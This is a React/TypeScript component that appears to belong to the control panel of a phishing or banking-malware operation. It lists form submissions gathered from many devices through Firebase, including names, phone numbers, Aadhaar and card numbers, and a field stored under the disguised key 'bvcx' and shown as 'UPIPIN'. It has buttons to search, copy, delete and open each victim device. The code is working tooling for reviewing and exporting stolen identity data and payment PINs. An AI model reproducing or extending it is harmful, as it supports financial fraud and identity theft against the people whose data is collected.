import { useState } from "react";
import { X, FileText, User, Phone, CreditCard, Search, Copy, Trash2, Eye, ChevronDown, ChevronUp, Smartphone } from "lucide-react";
import { DeviceForm, useFirebaseUsers } from "@/hooks/useFirebaseData";
import { ref, remove } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { format } from "date-fns";
import { toast } from "sonner";
import DeviceDetail from "@/components/DeviceDetail";

interface AllFormsOverlayProps {
  formsMap: Record<string, DeviceForm[]>;
  onClose: () => void;
}

const FieldIcon = ({ field }: { field: string }) => {
  const lower = field.toLowerCase();
  if (lower.includes("name")) return <User className="h-3 w-3 text-green" />;
  if (lower.includes("mobile") || lower.includes("phone")) return <Phone className="h-3 w-3 text-cyan" />;
  if (lower.includes("aadhaar") || lower.includes("card") || lower.includes("id") || lower === "bvcx") return <CreditCard className="h-3 w-3 text-pink" />;
  return <FileText className="h-3 w-3 text-muted-foreground" />;
};

const AllFormsOverlay = ({ formsMap, onClose }: AllFormsOverlayProps) => {
  const [search, setSearch] = useState("");
  const [expanded, setExpanded] = useState<string | null>(null);
  const [openDeviceId, setOpenDeviceId] = useState<string | null>(null);
  const { users } = useFirebaseUsers();

  // Flatten all forms with deviceId
  const allForms = Object.entries(formsMap).flatMap(([deviceId, forms]) =>
    forms.map((f) => ({ ...f, deviceId }))
  );
  allForms.sort((a, b) => b.timestamp - a.timestamp);

  const filtered = search.trim()
    ? allForms.filter((f) => {
        const q = search.toLowerCase();
        if (f.deviceId.toLowerCase().includes(q)) return true;
        return Object.values(f.content).some((v) => v.toLowerCase().includes(q));
      })
    : allForms;

  return (
    <div className="fixed inset-0 z-50 bg-background flex flex-col animate-in slide-in-from-bottom-4 fade-in duration-300">
      {/* Header */}
      <header className="shrink-0 px-4 pt-4 pb-3 border-b border-border">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2.5">
            <div className="h-10 w-10 rounded-xl gradient-purple-pink flex items-center justify-center glow-purple">
              <FileText className="h-5 w-5 text-primary-foreground" />
            </div>
            <div>
              <h2 className="font-bold text-foreground text-base">All Forms</h2>
              <p className="text-[10px] text-muted-foreground">{allForms.length} forms across all devices</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-destructive/10 hover:text-destructive hover:border-destructive/30 transition-all"
          >
            <X className="h-4 w-4" />
          </button>
        </div>
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search forms..."
            className="w-full rounded-xl border border-border bg-card pl-9 pr-4 py-2 text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
          />
        </div>
      </header>

      {/* Forms list */}
      <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2.5">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 gap-3">
            <div className="h-12 w-12 rounded-2xl bg-card border border-border flex items-center justify-center">
              <FileText className="h-5 w-5 text-muted-foreground" />
            </div>
            <p className="text-xs text-muted-foreground">No forms found</p>
          </div>
        ) : (
          filtered.map((form) => {
            const formId = `${form.deviceId}-${form.key}`;
            return (
            <div key={formId} className="rounded-2xl border border-border bg-card p-3.5 hover:border-primary/20 transition-all">
              <div className="flex items-center justify-between mb-2">
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-md bg-primary/10 text-primary font-semibold">{form.deviceId.slice(0, 10)}…</span>
                <span className="text-[10px] text-muted-foreground">
                  {form.timestamp ? format(new Date(form.timestamp), "MMM dd, HH:mm") : "N/A"}
                </span>
              </div>

              {/* Preview: show first 2 fields always */}
              <div className="space-y-1.5">
                {Object.entries(form.content).slice(0, expanded === formId ? undefined : 2).map(([key, value]) => {
                  const displayKey = key === "bvcx" ? "UPIPIN" : key;
                  return (
                    <div key={key} className="flex items-start gap-2">
                      <FieldIcon field={key} />
                      <span className="text-[10px] text-muted-foreground min-w-[60px]">{displayKey}</span>
                      <span className="text-[11px] text-foreground font-mono break-all">{value}</span>
                    </div>
                  );
                })}
              </div>

              {/* Actions */}
              <div className="flex items-center gap-1.5 mt-2.5">
                {Object.keys(form.content).length > 2 && (
                  <button
                    onClick={() => setExpanded(expanded === formId ? null : formId)}
                    className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-secondary border border-border text-[10px] font-medium text-muted-foreground hover:text-foreground hover:border-foreground/20 active:scale-95 transition-all"
                  >
                    {expanded === formId ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
                    {expanded === formId ? "Less" : "View All"}
                  </button>
                )}
                <button
                  onClick={() => {
                    const text = Object.entries(form.content).map(([k, v]) => `${k === "bvcx" ? "UPIPIN" : k}: ${v}`).join("\n");
                    navigator.clipboard.writeText(text);
                    toast.success("Copied");
                  }}
                  className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-secondary border border-border text-[10px] font-medium text-muted-foreground hover:text-foreground hover:border-foreground/20 active:scale-95 transition-all"
                >
                  <Copy className="h-3.5 w-3.5" />
                  Copy
                </button>
                <button
                  onClick={async () => {
                    try {
                      await remove(ref(db, `users/${form.deviceId}/forms/${form.key}`));
                      toast.success("Form deleted");
                    } catch { toast.error("Failed to delete"); }
                  }}
                  className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-destructive/10 border border-destructive/20 text-[10px] font-medium text-destructive hover:bg-destructive/20 active:scale-95 transition-all"
                >
                  <Trash2 className="h-3.5 w-3.5" />
                  Delete
                </button>
                <button
                  onClick={() => setOpenDeviceId(form.deviceId)}
                  className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-primary/10 border border-primary/20 text-[10px] font-medium text-primary hover:bg-primary/20 active:scale-95 transition-all"
                >
                  <Smartphone className="h-3.5 w-3.5" />
                  View Device
                </button>
              </div>
            </div>
            );
          })
        )}
      </div>

      {openDeviceId && users[openDeviceId] && (
        <DeviceDetail id={openDeviceId} user={users[openDeviceId]} onClose={() => setOpenDeviceId(null)} />
      )}
    </div>
  );
};

export default AllFormsOverlay;
